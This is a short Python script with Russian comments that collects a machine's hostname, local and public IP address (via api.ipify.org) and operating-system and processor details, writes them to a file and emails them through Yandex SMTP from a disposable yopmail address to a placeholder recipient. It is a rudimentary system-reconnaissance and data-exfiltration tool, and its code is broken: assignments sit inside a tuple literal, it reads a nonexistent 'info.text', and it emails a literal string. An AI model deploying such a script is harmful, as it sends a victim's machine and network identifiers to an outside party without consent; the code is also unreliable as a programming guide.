#!/bin/python3
import socket
from requests import get
import smtplib as smtp
from getpass import getpass
import platform


info = (
hostname = socket.gethostname()
# Определяем локальный (внутри сети) IP-адрес
local_ip = socket.gethostbyname(hostname)
# Определяем глобальный (публичный / в интернете) IP-адрес
public_ip = get('http://api.ipify.org').text
#
pl = platform.release()
#
ver = platform.version()
#
system = platform.system()
#
platforma = platform.platform() 
#
proc = platform.processor()
#
pm = platform.machine()
)
print(f'Machine: {pm}')
print(f'Processor: {proc}')
print(f'Платформа: {platforma}')
print(f'Система: {system}')
print(f'Релиз: {pl}')
print(f'Версия: {ver}')
print(f'Хост: {hostname}')
print(f'Локальный IP: {local_ip}')
print(f'Публичный IP: {public_ip}')



with open('info.txt', 'w') as file:
     file.write(info.text)
   
# Почта, с которой будет отправлено письмо
email = 'pedipiwibau-6538@yopmail.com'
# Пароль от нее (вместо ***)
password = '***'
# Почта, на которую отправляем письмо
dest_email = 'Your email'
# Тема письма
subject = 'IP'
# Текст письма
email_text = 'info.text'


message = 'From: {}\nTo: {}\nSubject: {}\n\n{}'.format(email, dest_email, subject, email_text)


server = smtp.SMTP_SSL('smtp.yandex.com') # SMTP-сервер Яндекса
server.set_debuglevel(1) # Минимизируем вывод ошибок (выводим только фатальные ошибки)
server.ehlo(email) # Отправляем hello-пакет на сервер
server.login(email, password) # Заходим на почту, с которой будем отправлять письмо
server.auth_plain() # Авторизуемся
server.sendmail(email, dest_email, message) # Вводим данные для отправки (адреса свой и получателя и само сообщение)
server.quit() # Отключаемся от сервера
